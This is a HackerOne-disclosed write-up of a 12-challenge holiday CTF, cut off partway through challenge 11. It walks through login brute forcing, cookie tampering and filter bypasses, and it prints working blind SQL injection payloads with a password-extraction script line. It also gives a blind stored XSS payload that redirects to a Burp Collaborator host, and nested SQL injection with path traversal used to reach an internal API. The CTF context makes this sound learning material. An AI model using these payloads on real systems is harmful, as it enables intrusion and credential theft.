---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - fix/file-validation
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2021-01-14
submitted: 2020-12-25T11:31:58.554Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "a_l"
source: "https://hackerone.com/reports/1066233"
title: "CTF Writeup"
---
# CTF Writeup

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 5 | **Program:** h1-ctf | **Disclosed:** 2021-01-14

- Report: [https://hackerone.com/reports/1066233](https://hackerone.com/reports/1066233)
- CWE: SQL Injection
- Submitted: 2020-12-25T11:31:58.554Z

## Report summary

CTF Writeup:
=====================
This CTF was consisted of 12 challenges. Each day a new challenge was released by HackerOne.

Challenge 1 (Robots.txt):
---------------------
__Tools I used:__ Just my browser.

This challenge was really easy, I just checked the ```robots.txt``` file and got the flag.
{F1165514}

Challenge 2 (DOM Flag):
---------------------
__Tools I used:__ Just my browser.

As we can see in the ```robots.txt``` file, there is a "hidden" path ```/s3cr3t-ar3a```. Accessing this path reveals the following message:
{F1165520}

I started to search for interesting things in the DOM, by using the browser Inspect Element functionality, and I found both the flag, and the path for the next challenge.
{F1165523}

Challenge 3 (People Rater):
---------------------
__Tools I used:__ Just my browser.

We disclosed the path ```/apps``` in the previous challenge. 
__Note:__ From now on, all of the challenges, except challenge 11 and 12, will appear in the ```/apps``` page.

This challenge starts with a clickable list of buttons. Each button contains an unique value, which seems to be a base64 encoded value. 
Clicking on one of these buttons, causes my browser to send a HTTP GET request to ```/entry?id=``` endpoint, where the ```id``` GET parameter is set as the base64 encoded value of a specific button that I clicked on, as can be seen in the following pictures:

__This is an example of some requests:__
{F1165525}

__This is an example of 1 response:__
{F1165526}

I decoded one of the base64 values using the browser built-in Console. 
For example:
```atob('eyJpZCI6NX0=')``` => ```"{"id":5}"```

Then, I changed the ```id``` value to 1, and I encoded it back to base64:
```btoa('{"id":1}')``` => ```eyJpZCI6MX0=```

The final part is to access the ```/entry?id=eyJpZCI6MX0=``` endpoint, using our new base64 encoded value:
{F1165527}

Challenge 4 (Swag Shop):
---------------------
__Tools I used:__ Burp Suite.

This challenge starts with a page that contains 3 different items, which you can buy in the Gring swag shop, as can be seen here:
{F1165529}

After "playing" with the swag shop functionalities I found the following 3 API endpoints:

1./api/stock - this endpoint is used to fetch the 3 item details, such as the item name and the item price.
2./api/purchase - this endpoint can be used to buy items.
3./api/login - in order to buy items, you need to login. This endpoint is used to login to the system.

At this point, I noticed the /api/login endpoint did not enforce any kind of rate limitation, and therefore, I started to brute force the security credentials, using Burp Suite Intruder with a simple passwords wordlist. 
After few minutes, I started to brute force the ```/api/ ``` path, using Burp Suite Intruder with a simple API wordlist, in order to find some interesting endpoints. 

Using this technique, I found 2 additional endpoints:
1./api/user - accessing this endpoint gave me the following message: ```{"error":"Missing required fields"}```.
2./api/sessions - this was a really juicy endpoint which revealed all of the user sessions, as can be seen in the following picture:
{F1165530}

These sessions seems to be base64 encoded. One of these sessions contained a user UUID, as can be seen here:
{F1165532}
This UUID will be used shortly :)

Meanwhile, I ran another brute force attack, this time I tried to look for HTTP GET parameters for the /api/user endpoint. After few seconds, I discovered the ```uuid``` GET parameter which returned me the following error:
```{"error":"Could not find matching uuid"}```

So, I sent a HTTP GET request to /api/user endpoint using the disclosed UUID from the /api/sessions endpoint, and I got the flag:
{F1165533}

Challenge 5 (Secure Login):
---------------------
__Tools I used:__ Burp Suite, fcrackzip.

In this challenge we are given a login panel, as you can be seen here:
{F1165535}

First, I noticed there is no rate limitation, which means I should probably "brute force" my way in, but, how is that possible? I don't even know the username. 
Then, I saw the following error message: ```Invalid Username```.
It means the creator of this challenge gives us a hint about the way we should solve this challenge. In other word I need to brute force the username, then I will brute force the password of that username.
My first thoughts were about Timing Attack, but I decided to simply try to brute force the security credentials by using a Burp Suite Intruder.

I configured Burp Suite Intruder with a simple username list to brute force just the username, but I didn't launch the attack yet. I thought to myself, if I will manage to guess the username successfully, the next error message will probably be ```Invalid Password```.
Meaning I cannot filter out the server responses by the response length, because of the following:
```Invalid Username``` =>16 characters.
```Invalid Password``` => 16 characters.

__Note:__ the server always responses with ```HTTP 200 OK```.

Using the amazing Burp Suite Intruder Grep Extract functionality I could simply create a new filter, as can be seen here:
{F1165536}

and I executed my brute force attack in order to find the username:
{F1165537}

The username is ```access```.

Now, I can execute the 2nd brute force attack which will give me the password. Again, I used Burp Suite Intruder, this time with a simple password wordlist.
{F1165538}

The password is ```computer```.

As we can see the server sets the following cookie for us:
```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0= ```.

At this point I noticed that the cookie is a base64 encoded value, so I decoded it, which gave me the following:

```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=``` => ```{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}```.

Accessing the Secure Login website using this cookie led me to the following page:
{F1165539}

so I changed the base64 decoded value, specifically the ```"admin":false``` part to ```"admin":true```, and I base64 encoded it.

The new cookie base64 value looks like this:
```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==``` => ```{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}```.

I tried to access the website again, using the new cookie, and I received the following page:
{F1165540}

I downloaded this ```my_secure_files_not_for_you.zip``` zip file which contains the following 2 files:
{F1165541}

Trying to extract the zip file and read the flag, results in an error, due to the fact that the zip file is encrypted. However, this is a CTF and we should be able to crack the password :), so I used the ```fcrackzip ``` tool with the known ```rockyou.txt ``` password wordlist file, and I was able to break the password to extract the flag:
{F1165542}

In addition, this is the ```xxx.png ``` file content:
{F1165543}

Challenge 6 (My Diary):
---------------------
__Tools I used:__ Burp Suite.

When I accessed this challenge, I noticed it automatically redirects me to ```/?template=entries.html```, as can be seen here:
{F1165544}

It seems like the server uses ```template ``` GET parameter to "include" the ```entries.html ``` file, so I decided to use Burp Suite Intruder in order to brute force for existing files in the server. I configured Burp Suite Intruder with the Cluster Bomb attack type as can be seen here:
{F1165545}

After some time, it found the ```index.php ``` file, so I simply used it as the ```template ``` GET parameter value, and was able to leak the PHP source code of the challenge, as can be seen here:
{F1165546}

It seems like the goal is to read the ```secretadmin.php ``` file, since my input is used in the ```file_get_contents ``` function. But, first I simply tried to access it directly, instead of using the ```template``` GET parameter :)
It did not work, and I got the following message: ```You cannot view this page from your IP Address```. 
At this point, I knew I should read this file content by using the ```template ``` GET parameter, but I just wanted to check if I can bypass this restriction and access it directly - I could not.

Back to the PHP source code (modified with echo):
```
1.$page = $_GET["template"];
2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
3.echo $page;
4.$page = str_replace("admin.php","",$page);
5.echo $page;
6.$page = str_replace("secretadmin.php","",$page);
7.echo $page;
```
The goal is to reach line 6 where $page contains the string ```secretadmin.php```.
As we can see in line 2, $page is filtered in such a manner that will cause it to contain some specific characters only.

We can split this challenge into two small challenges:
1.The first goal is to pass line 4 where we have the value ```admin.php``` in $page.
2.The 2nd challenge will be to reach line 6, where $page is equal to secretadmin.php.

Solving the first challenge:
/?template=adminadmin.php.php

PHP code (output):
```
1.$page = $_GET["template"];
2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
3.echo $page; //adminadmin.php.php
4.$page = str_replace("admin.php","",$page);
5.echo $page; //admin.php
6.$page = str_replace("secretadmin.php","",$page);
7.echo $page; //admin.php
```

Solving the 2nd challenge:
/?template=secretadminsecretadminadmin.php.php.php

PHP code (output):
```
1.$page = $_GET["template"];
2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
3.echo $page; //secretadminsecretadminadmin.php.php.php
4.$page = str_replace("admin.php","",$page);
5.echo $page; //secretadminsecretadmin.php.php
6.$page = str_replace("secretadmin.php","",$page);
7.echo $page; //secretadmin.php
```

Now we can access the website using ```/?template=secretadminsecretadminadmin.php.php.php```, which will give us the ```secretadmin.php``` file content:
{F1165548}

By the way, we can see why I could not read the file directly here:
{F1165549}

Challenge 7 (Hate Mail Generator):
---------------------
__Tools I used:__ Burp Suite.

In this challenge we can view and create campaigns. Our goal, as usual, is to find the hidden flag.
There is only one campaign in this challenge, name as Guess What, which we can access to, as you can see here:
{F1165557}
Clicking on the Preview button, moves us to the actual campaign page, where the Markup section of this campaign is rendered. For example:
{F1165558}

I mentioned that we can also create our campaigns, well.. this is not entirely true. We can write our campaign and we can also preview it, but we cannot publish it :(
I noticed the Markup section of the campaign is vulnerable to XSS:
{F1165562}

So my plan was to exploit this XSS vulnerability, and publish my campaign, which will be triggered once the admin of this challenge visit it. Then, I will be able to extract the admin cookies and also the DOM, which might contain sensitive data. But, it seems like there is no way to publish my campaign so I tried something else.

I started to "play" with the Markup section of my campaign, for example, I sent this input:
{F1165563}

Which gave me the following output:
{F1165564}

Clicking the Preview button causes my browser to send a HTTP POST request with the following data:
```preview_markup=Hello+%7B%7Bname%7D%7D+....&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D ```

At this point, I started to test some SSTI attacks which did not work, so I took at break from this challenge. 
Few hours later I started again, and this time I noticed the challenge campaign, Guess What, contains the following interesting data: ```{{template:cbdj3_grinch_header.html}}```.
This "template" string ```{{template:file}}``` is a special keyword, it enables us to retrieve data. More specifically, the server will try to get the {{template:file}} for us.

I crafted and sent a simple campaign review request to the server, as follows:
```preview_markup={{template:test}}&preview_data= ```
The output:
```Cannot find template file /templates/test```

It seems like the server attempts to "load" the ```test``` file from /templates folder. so I simply tried to access this folder:
{F1165565}

There is a "secret" template file ```38dhs_admins_only_header.html``` which we did not know about. Trying to access it directly gave me HTTP 403 Forbidden, so I tried to read this file using the campaign preview functionality.

I sent the following Markup data:
```preview_markup={{template:38dhs_admins_only_header.html}}&preview_data= ```
The output:
```You do not have access to the file 38dhs_admins_only_header.html```

Our goal is clear, we just need to read that file!
I spent some time on Path Traversal techniques and some other techniques which did not work at all. After some time I thought about using the HTTP POST parameter ```preview_data```, in order to "pass" this forbidden HTML file to the ```preview_markup``` template.

The plan was to create a variable, using the ```preview_data``` POST parameter, which will "point" to the string "38dhs_admins_only_header.html", and then I could simply replace that variable with the forbidden file, but it did not work as I expected. After trying some other things I got the following output for this request:

The request:
```preview_markup={{a}}&preview_data={"a":["b","c"]} ```

The output:
```Array ```

I knew this was the way to solve this challenge, I just had to find the right way to "point" to that forbidden file. After several minutes I tried the following payload:

The request:
```preview_markup={{a}}&preview_data={"a":"{{template:38dhs_admins_only_header.html}}"} ```

The output:
{F1165566}

Challenge 8 (Forum):
---------------------
__Tools I used:__ Burp Suite.

In this challenge we need hack our way in to the admin section.
Accessing the main page of the challenge gives us the following page:
{F1165567}

I spent some time on this website, gathering information such as the username grinch and max. I also tried to brute force their security credentials using Burp Suite Intruder with a simple password wordlist, but I failed to do so.

So, I decided to execute a brute force attack on the path URI, in order to find some hidden endpoints. I configured my Burp Suite Intruder with a simple wordlist of known directories, and I had a hit!
I found the hidden ```/phpmyadmin``` endpoint, as you can see here:
{F1165568}

I tried to brute force my way in using Burp Suite Intruder again using the usernames grinch and max, but it did not work. 
At this point, I took a break from this challenge, and I even solved the next challenge before I solved this one. I came back to this challenge and I tried to look for more hidden endpoints using a bigger wordlist, and I also tried to brute force grinch, and max security credentials, again, using a bigger password wordlist, but it did not work for me.

I entered the "Nice Things To Do" section in the forum and I saw the message: 
```There are no posts in this section ```.

I tried to search this message in github and I found the following:
{F1165569}
Grinch-Networks!!

I started to search for interesting data and I found the database security credentials inside the ```/models/Db.php``` file:
{F1165570}

I tried to use these security credentials in order to login to the /phpmyadmin panel, and it worked!. Inside the phpmyadmin I found the security credentials of grinch, and max, but there were not stored as a plaintext:
{F1165571}

It seems like it saves a MD5 hash of their password, so the first thing I tried to do was to google grinch hash:
{F1165572}

As you can see this MD5 hash is saved in a known MD5 hash list, or someone else already searched for this hash, and therefore, it is saved in this website :)

I tried to login to the forum using Grinch and BahHumbug as the password and it worked:
{F1165573}

Inside the admin section I found the flag:
{F1165574}

Challenge 9 (Evil Quiz):
---------------------
__Tools I used:__ Burp Suite, evilquiz.py (created by me).

This challenge starts by asking for our name:
{F1165575}

__Note:__ you can also see the Admin button in the top right side corner of the picture. This button leads to the admin panel login.

After we submit our name to the server, it enables us to answer some questions, and finally we can see our score by accessing the ```/score``` endpoint:
{F1165576}

As we can see, according to the message, there is only 1 other player with the same name as me (test-for-writeup).
It looks like the server executes some sort of "count" SQL query which might look like this:
```SELECT COUNT(column_name) FROM table_name WHERE name='test-for-writeup'; ```

I tried to change my name to ```test-for-writeup'or'1'='1 ```, by sending a HTTP POST request to /evil-quiz endpoint:
{F1165577}

As you can see, now there are 1213999 other players with the same name as mine, because I successfully manipulated the SQL query by using the ```'or'1'='1 ``` input, this attack vector is also known as a SQL injection. 
More specifically, The vulnerability in this challenge is known as a Blind SQL injection, which is also classified as a "second order" type. Meaning we inject our "malicious" payload in the ```/evil-quiz``` endpoint, and our malicious payload is only executed when we access the ```/score``` endpoint.

Our goal is clear, we need to dump the whole database :D
By exploiting this vulnerability we can actually dump the whole database content, for instance, I can "ask" the database series of "questions", which will help me to "slowly" pull out the its whole content.

But first, we need to find what is type of this database. I simply "asked" the database the following "questions":

Input:
```test-for-writeup'or'1'='1'-- ```
Output:
```There is 0 other player(s) with the same name as you! ```
This might be a PostgreSQL or a Microsoft SQL, but it is definitely not Oracle.

Input:
```test-for-writeup'or'1'='1'--+ ```
Output:
```There is 1213999  other player(s) with the same name as you! ```
This must be MySQL.

The next "question" we want to "ask" is how many columns the current table has?
we can do that by using the "order by" keyword, or just using the UNION operator. Using the "order by" keyword is possible due to the fact that we do not actually need the column names, but we can sort them out using their index as follows:

Input:
```test-for-writeup'or'1'='1'+order+by+1--+ ``` 
Output:
```There is 1213999  other player(s) with the same name as you! ```.

Input:
```test-for-writeup'or'1'='1'+order+by+1,2--+ ```
Output:
```There is 1213999  other player(s) with the same name as you! ```.

Input:
```test-for-writeup'or'1'='1'+order+by+1,2,3--+ ```
Output:
```There is 1213999  other player(s) with the same name as you! ```.

Input:
```test-for-writeup'or'1'='1'+order+by+1,2,3,4--+ ```
Output:
```There is 1213999  other player(s) with the same name as you! ```.

Input:
```test-for-writeup'or'1'='1'+order+by+1,2,3,4,5--+ ```
Output:
```There is 0 other player(s) with the same name as you! ```.


__There are 4 columns in the current table__.

In order to pull out data we will use the ```UNION``` operator, but we also need to verify the type of the column ,which we are going to inject our payload in, is the same type of the data we are going to retrieve. 

We are going to pull out "string" type data, and column 4 supports this type, as we can see here:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,'a'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

Now, we can start to pull out the table names from the database. 
First, I manually checked for few specific tables such as flag, secret, and admin.
If there are exist, we do not need to pull out table names from the database, maybe :)

I did it by injecting the following payload as my name:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,table_name+from+information_schema.tables+where+table_name+LIKE+'admin%'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

I found out that there is 1 table which __starts__ with the name ```admin``` so I changed my query in order to know for sure if the table name is equal to admin:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,table_name+from+information_schema.tables+where+table_name+='admin'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

The table name is indeed admin!

It is time to pull out the admin table columns:
Again, I tried to find a "shortcut" and guess the column names, for example, there might be a username and a password columns right?

I injected the following payloads:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,column_name+from+information_schema.columns+where+table_name='admin'+and+column_name='username'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,column_name+from+information_schema.columns+where+table_name='admin'+and+column_name='password'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

There are username and password columns :D

It is time to pull out their content. This time I wrote a simple python script to do that for me.
This script simply exploits the Blind SQL injection vulnerability, and fetching the results (true or false) from the ```/score``` endpoint, as I mentioned this vulnerability is classified as a second-order injection.

Before I even started to write the script, I tried to check if the username is grinch or admin by sending the following payload as my name:

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,username+from+admin+where+username='grinch'--+ ```
Output:
```There is 0 other player(s) with the same name as you! ```.

Input:
```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,username+from+admin+where+username='admin'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

The username is admin, and therefore, I just my script to leak the admin password. For now there is no need to search for the username.

The script is attached to this writeup, and its name is evilquiz.py.
A quick review of the "core" query of my script:

```
requests.post("https://hackyholidays.h1ctf.com/evil-quiz", headers=headers,data={"name":"name=test-for-writeup' AND 1=2 union select 1,2,3,password from admin where username='admin' and password LIKE '"+found+str(bf[i])+"%'-- "})
```

As you can see, I will leak the whole password by using the LIKE operator:
{F1165578}

The password is __s3cret_p4ssw0rd-$__

I tried to login to the admin panel using the leaked security credentials and I failed :o
After few seconds I tried to send the following payloads as my name:

Input:
```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+password+LIKE+'s3cret_p4ssw0rd-$'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

Input:
```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+password+LIKE+'S3cret_p4ssw0rd-$'--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

It seems like I forgot about case sensitive, so I manually tested for that. For example:

Input:
```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+ascii(substr(password,1,1))=ascii('s')--+ ```
Output:
```There is 0 other player(s) with the same name as you! ```.

Input:
```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+ascii(substr(password,1,1))=ascii('S')--+ ```
Output:
```There is 1 other player(s) with the same name as you! ```.

The first letter is capital S :)

At the end I got: ```S3creT_p4ssw0rd-$```
I logged in to the admin panel and I got the flag:
{F1165579}

Challenge 10 (Signup Manager):
---------------------
__Tools I used:__ Burp Suite.

The challenge starts with a simple page where we can login, and sign up to the system:
{F1165580}

Using Burp Suite, I quickly noticed this HTML comment at the start of the page:
```<!-- See README.md for assistance -->```

I tried to access this file and it worked:
{F1165581}

According to the ```README.md``` file:
1.There is a file name ```users.txt```, which probably contains some information about the users (might be interesting).
2.The default credentials are admin:password (I logged in using these credentials and it was a dead end)
3.In order to be an admin the last character should be Y? (interesting).
4.Also there is a file name ```signupmanager.zip```, which we might be able to download if not moved.
5.There are ```user.php``` and ```admin.php``` files.

My first approach was to create an account, and login to this account. By doing so I got the following message:
{F1165582}

I tried to access ```admin.php``` file and I received the following message:
```You cannot access this page directly```.

I had a plan! it was perfect plan!
As we can see the message I received when I logged in to my account, says:
```We'll have a look into you and see if you're evil enough to join the grinch army! ```
In other words, someone (the admin) will probably look at my profile somewhere in this website, and I have to create an account which contains XSS payloads in every possible location. 
Then, once the admin will visit the page which contains my malicious payload, I will be able to execute arbitrary JavaScript on its browser and fetch sensitive data. I might even be able to visit admin.php, who knows? By the way, this attack is known as Blind Stored XSS. 

So I created a new account with the following payload in every field:
```<img src=x onerror='document.location="//f9pu6rt561v3sw6jckr01l41jspid7.burpcollaborator.net"'>```

I waited few minutes and nothing happened. Then I remembered the ```signupmanager.zip``` file which I might be able to download. I tried to download this file and it worked, they did not move the file. 
At this moment, I knew the Blind Stored XSS is not going to solve this challenge I have to focus on this zip file.

This zip file contained the whole website source code, it was amazing!
I started to go over the code and understand this system.
In addition, I hosted a PHP server locally where I ran the challenge code. Also, I modified some specific parts in the code.
For example, I added some ```var_dump``` function calls and ```echo``` statements in the buildUsers function, as you can see here:
{F1165583}

I also tampered with the ```users.txt``` file, then I just registered and Inspected the output which was modified by me, as can be seen in the following picture:
{F1165584}

As I can see both in the code and in the ```users.txt```, the regular user string ends with the "N" character.
The challenge is to somehow manipulate the registration functionality, and cause the string of my account to end with the "Y" character.

To be honest, I solved it quickly.
I knew I was looking for a "Off-by-one" vulnerability. As we can see by the code, our input is very limited:
{F1165585}

The first place I was looking at was the ```$random_hash``` and the ```$password``` variables, as they are seems to be not limited, but, then I noticed I cannot control them because they both hold a MD5 hash, which is also limited to 32 bytes.
After few minutes, I noticed the ```$age``` variable, which is the only variable, except ```$random_hash```, and ```$password```, that is being modified before its assignment:
{F1165586}

My payload is limited to 3 characters, and also must return true when ```is_numeric``` function is called (according to the code).

I tried the following things:
{F1165587}
It worked!

I can use ```9e9``` which is a 3 character long, and also apply for the ```is_numeric```.
Now I have the ability insert more characters via the ```$age``` variable, which will eventually "push" other variables characters location in my user string!.
In order to exploit this vulnerability I just need to fill my last name with some YYYY... characters.

Local demo:
{F1165593}

Exploited the vulnerability in the CTF environment:
{F1165588}

Challenge 11 (Recon Server):
---------------------
__Tools I used:__ Burp Suite, sqlmap, recon.py (created by me).

The challenge starts with the following page:
{F1165598}

As you can see, there are three recon albums which we can access to:
1.Xmas 2020
2.Xmas 2019
3.Xmas 2018

Accessing one of these albums, for example, the Xmas 2020, moves us to the following endpoint:
```/album?hash=jdh34k ```

When this endpoint is accessed using the ```hash ``` GET parameter value as ```jdh34k ```, we get three pictures.
These pictures are embedded to the page by the following way:
{F1165599}

Here is an URL of one of these pictures:
```/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9 ```

I noticed the ```data``` GET parameter value is a base64 encoded value, so I decoded it:

This is the decoded value of the aforementioned base64 string:
```{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"} ```

As we can see this is a JSON format which contains the two following keys:
1.image
2.hash

The first thing we can learn from this JSON is the folder ```/uploads ``` which has the actual images. I tried to manually access the ```/uploads``` folder, but I failed to do so (HTTP 403 Forbidden). Then, I tried to access the ```9b881af8b32ff07f6daada95ff70dc3a.jpg``` image file directly, but I received the following error message:
```Image cannot be viewed directly```.

Back to the JSON:
The second thing I tried was to change the path inside the ```image ``` value, to something else. For example:
1.I tried to change it to other existing image file - failed due to ```invalid authentication hash ```.
2.I tried to use some Path Traversal techniques - failed due to ```invalid authentication hash ```.
3.I also tried to manipulate the ```hash``` value, so the server validation will pass, but it did not work - failed due to ```invalid authentication hash```.
4.I tried to change the form of this JSON keys to arrays - failed due to ```Invalid data format ```.
5.I also tried to send the ```image``` key twice, with one correct ```hash``` (vice versa) - failed ```invalid authentication hash ```.
6.I even tried to guess other "hidden" keys, using brute force by the Burp Suite extension ```Turbo Intruder ```.

It seems like the goal is not so clear, I had no idea what to do, so I started all over again.
This time I noticed the following message in the first page of the challenge:
```We are currently developing an API, apologies for anything that doesn't work quite right ```.
I simply accessed ```/api ``` endpoint and it worked:
{F1165624}

Then, I tried to brute force for "hidden" API endpoints using Burp Suite Intruder with a simple API wordlist.
each request got the same response:
```{"error":"This endpoint cannot be visited from this IP address"} ```

At this point, I tried several things such as adding some ```X- ``` HTTP headers to my requests.
For instance, the ```X-Forwarded-For ``` HTTP header with the value 127.0.0.1. I also attempted to abuse hop-by-hop headers, but still nothing.

I had a plan but I did not know how to execute it. My plan was to execute the brute force attack for the ```/api/ ``` endpoint, using the ```/picture ``` endpoint.
As far I as know the ```/picture ``` endpoint causes the server to fetch the desired image for me. Meaning the __server__ performs the request, which will bypass the ```{"error":"This endpoint cannot be visited from this IP address"} ``` error message. But, I have to somehow bypass the ```hash``` restriction.

I had no idea how to manipulate the ```hash``` validation, so I checked again all of the endpoints I already know. Maybe I missed something. Few seconds later, I realized that I missed the ```/album?hash=``` endpoints.
I tried to tamper with the ```hash``` GET parameter value in any way I know. I decided to execute ```sqlmap``` tool in order to find SQL injection vulnerability, and I took a break a long break.

After few hours, I noticed that the ```sqlmap``` discovered that ```hash``` GET parameter is vulnerable to a Blind SQL Injection attack! :)
Now, I can dump the whole content of the database, and maybe I will find the flag!.
However, it makes no sense to find the flag in the database, since I did not use the ```/api/ ``` endpoints at all.

I launched ```sqlmap ``` which gave me the following information:
There are two databases:
1.recon
2.information_schema

I decided to focus on the ```recon``` database, and therefore, I reconfigured ```sqlmap ```, and relaunched the attack:
Several minutes later, I had the following data:

```
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+

Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
```

Noticed the ```hash ``` key of the JSON data, which was used in order to validate the ```image ``` value, is not stored in the database o_o. Meaning the server somehow calculates this hash on the fly.
I had to guess how things work behind the scenes.
My guess was:
1.I access the ```/album?hash=jdh34k ``` endpoint.
2.The server executes a SQL query, which attempts to find what is the ```id``` of that ```hash ``` in ```album ``` table.
In this case the hash ```jdh34k``` would be ```id ``` 3.
```
| id | hash   | name      |
+----+--------+-----------+
| 3  | jdh34k | Xmas 2020 |
```
3.Then the server executes another query, using that output, and it looks in the ```photo``` table, specifically on the ```album_id ``` column, in order to fetch all of the ```photo ``` column content that are related to this ```album_id ```.
In our case:
```
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
```
4.The server will calculate a valid ```hash``` for the aforementioned photos.
5.Then, this valid ```hash``` will be displayed on the HTML page.

My plan is to manipulate the output of the first SQL query, using the SQL Injection vulnerability, in such a manner that will affect the ```photo ``` value, which is then used by the server in its ```hash ``` calculation process.
More specifically, I want to gain full control over the ```photo ``` value, then I will be able to retrieve a valid ```hash``` from the server, without even knowing the algorithm :)

I started to manually test the SQL Injection vulnerability as you can see in the following pictures:

SQL Injection test:
{F1165601}
The number 3 is reflected back in the HTML page, which means the injection point is not 3rd column.

At this point, I noticed it is possible to exploit a Reflected XSS vulnerability, using SQL Injection :D
{F1165602}
It has nothing to do with the solution of this challenge.

I tried to manipulate the query by injecting another UNION operator, which will be used as the input of the 2nd SQL query, that I was looking to exploit, and it worked!
{F1165603}

The server calculated the hash for the input __123__:
{F1165604}

Lets break down my exploit:

```?hash=jdh34k'+AND+1=2+union+select+"'+union+select+null,null,'123'--+",2,3--+ ```

1.First, we are using the single quote ```' ``` character to breakout the original SQL query.
2.Then, we concatenate the AND operator with a false statement. we could also supply a wrong ```hash``` value, instead of using the AND operator.
3. We use the UNION operator and we are setting the first column to the following string:
```"'+union+select+null,null,'123'--+" ```

This string starts with a single quote character ```' ```, which will escape the 2nd SQL query. 
Also, the UNION operator is selecting three columns, as the second SQL query is expecting to get three columns results.
At the end of the second query injection there I added the ```--+" ``` characters due to the fact the we just escaped from the original second query and we don't want to "break" the syntax.
The quotes ```" ``` character is used to close the string of this injection payload (do not forget, we are injecting this payload by using another UNION operator).
Now, I just simply added the ```,2,3--+``` data, as part of the first UNION operator.

Right now, I had the ability to cryptographically sign arbitrary ```image``` file, but our input is concatenated to the ```/uploads/ ``` folder as you can see here:

```{"image":"r3c0n_server_4fdk59\/uploads\/123","auth":"80317c9bb75fec6949fd4e33b329e4a1"} ```

Well, I just used a Path Traversal ```../ ``` sequence in order to read access arbitrary endpoints.
First, I tried to access a resource, which is out of this challenge, for example the ```/assets/images/grinch-networks.png ```

Input:
```?hash=jdh34k'+AND+1=2+union+select+"'+union+select+null,null,'../../assets/images/grinch-networks.png'--+",2,3--+ ```

Output (base64 decoded):
```{"image":"r3c0n_server_4fdk59\/uploads\/..\/..\/assets\/images\/grinch-networks.png","auth":"e074528ae20d136249766f2cef6e3279"} ```

I accessed the following endpoint, and it worked :)
```/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC8uLlwvYXNzZXRzXC9pbWFnZXNcL2dyaW5jaC1uZXR3b3Jrcy5wbmciLCJhdXRoIjoiZTA3NDUyOGFlMjBkMTM2MjQ5NzY2ZjJjZWY2ZTMyNzkifQ== ```

So I started to manually search for ```/api/``` endpoints using this technique:

For example:
Input (inside the UNION operator):
```../api/test ```

Output:
```Expected HTTP status 200, Received: 404 ```

There is no ```/api/test``` endpoint, but, at least I managed to bypass this error message:
```{"error":"This endpoint cannot be visited from this IP address"} ```

After few attempts I had a hit!

Input (inside the UNION operator):
```../api/user ```

Output:
```Invalid content type detected ```

I started to look for HTTP GET parameters:

Input (inside the UNION operator):
